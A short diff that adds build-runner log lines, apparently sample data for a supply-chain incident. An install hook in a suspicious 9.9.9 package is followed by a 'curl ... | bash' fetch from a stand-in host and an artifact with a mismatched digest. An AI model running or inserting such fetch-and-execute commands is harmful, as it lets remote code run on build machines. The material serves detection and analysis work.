@@ -1,0 +1,4 @@
+2026-06-11T09:57:10Z source=build-runner event=npm_ci package=orion-build-utils@9.9.9 signal=postinstall
+2026-06-11T09:58:04Z source=build-runner event=remote_script message="curl https://updates.example.invalid/orion/bootstrap.sh | bash"
+2026-06-11T10:00:02Z source=build-runner event=artifact_created name=orion-update.tar.gz digest=mismatch
+
